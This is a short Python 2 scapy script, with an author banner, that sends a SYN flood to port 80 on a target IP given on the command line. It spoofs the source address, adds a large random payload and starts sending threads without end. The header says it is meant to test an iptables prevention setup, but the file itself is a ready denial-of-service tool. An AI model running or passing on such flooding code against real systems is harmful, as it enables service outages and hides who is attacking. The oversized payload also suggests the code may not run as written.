#! /usr/bin/env python
# Name : Subodh Pachghare
# CyberSpace Name : HaX0R (Cyberninja)
# Website : www.thesubodh.com
# Description : SYN Flood Packet creation for iptables prevention solution

import sys
from scapy.all import *
import threading
import os

class ThreadClass(threading.Thread):
  def __init__(self, p):
    super(ThreadClass, self).__init__() 
    self.p = p

  def run(self):
    send(self.p)
    
if __name__ == "__main__":
	print "generating payload"
	payload = "\x00" + os.urandom(65534) + "\x00"
	print "done generating payload"

	#conf.verb=0
	print "Field Values of packet sent"
	p = IP(src="55.55.55.55", dst=sys.argv[1], id=1111,ttl=99)/TCP(sport=RandShort(), dport=[80], seq=12345, ack=1000, window=1000, flags="S")/payload
	ls(p)
	i = 0
	while True:
	  print "starting thread %d" % i
	  i += 1
	  ThreadClass(p).start()
